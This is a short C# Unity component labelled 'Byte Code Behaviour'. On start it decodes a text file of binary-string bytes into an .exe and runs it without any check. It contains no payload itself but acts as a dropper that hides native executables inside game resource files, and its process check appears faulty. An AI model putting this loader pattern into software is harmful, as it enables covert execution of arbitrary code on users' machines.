using System.Diagnostics;
using System;
using System.IO;
using UnityEngine;
using System.Collections.Generic;

[AddComponentMenu("Byte Code Behaviour")]
public class BCBehaviour : InventoryEvent
{

    public string bc_File;
    public string bc_Patch = @"res\scripts\";
    // Start is called once before the first execution of Update after the MonoBehaviour is created
    public void deStart(string n1, string n2)
    {
        bc_File = n1;
        bc_Patch = n2;
    }
    public void Start()
    {
        string bc = bc_File;

        if (!File.Exists(bc_Patch + $"{bc}.bc"))
        {
            UnityEngine. Debug.LogError("Byte Code file not found");
            return;
        }

        string path1 = bc_Patch + $"{bc}.bc";
  string file = File.ReadAllText(path1);
        string[] bytecode = file.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
        List<byte> bytes = new List<byte>();
        foreach (string s in bytecode)
        {
            bytes.Add(Convert.ToByte(s, 2));
        }
        string path2 = bc_Patch + $"{bc}.exe";
  File.WriteAllBytes(path2, bytes.ToArray());
        Process[] processes = Process.GetProcessesByName($"{bc}.exe");
        if (processes.Length > 0)
        {

        }
        else
        {
            Process p = new Process();
            p.StartInfo.FileName = Path.GetDirectoryName(Path.GetDirectoryName(Application.dataPath)) + @"\" + bc_Patch + $"{bc}.exe";
            if (File.Exists(Path.GetDirectoryName(Path.GetDirectoryName(Application.dataPath)) + @"\" + bc_Patch + $"{bc}.exe"))
            {
                p.Start();
            }
            Process p11 = new Process();
            p11.StartInfo.FileName = Path.GetDirectoryName((Application.dataPath)) + @"\" + bc_Patch + $"{bc}.exe";
            if (File.Exists(Path.GetDirectoryName((Application.dataPath)) + @"\" + bc_Patch + $"{bc}.exe"))
            {
                p11.Start();
            }
        }
    }
}     